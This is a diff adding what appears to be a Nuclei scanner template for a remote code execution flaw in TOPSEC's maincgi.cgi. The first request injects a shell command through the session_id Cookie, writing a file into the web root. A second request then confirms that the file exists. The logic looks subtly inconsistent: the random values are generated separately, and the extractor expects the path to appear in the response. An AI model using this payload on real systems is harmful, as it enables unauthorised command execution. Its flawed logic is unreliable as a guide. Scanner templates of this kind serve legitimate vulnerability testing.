@@ -1,0 +1,35 @@
+id: poc-yaml-topsec-maincgi-cgi-rce
+info:
+  name: 天融信TOPSEC maincgi.cgi 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,两高一弱
+http:
+  - raw:
+      - |
+        GET /cgi/maincgi.cgi?Url=check HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session_id_443=1|echo '{{rand_base(6)}}' >> /www/htdocs/site/image/{{rand_base(6)}}.txt;
+    extractors:
+      - type: regex
+        name: extracted_filename
+        internal: true
+        regex:
+          - "/www/htdocs/site/image/([a-zA-Z0-9]+)\\.txt"
+  - raw:
+      - |
+        GET /site/image/{{extracted_filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "{{extracted_filename}}"
+      - type: word
+        part: header
+        words:
+          - "TOPSEC"
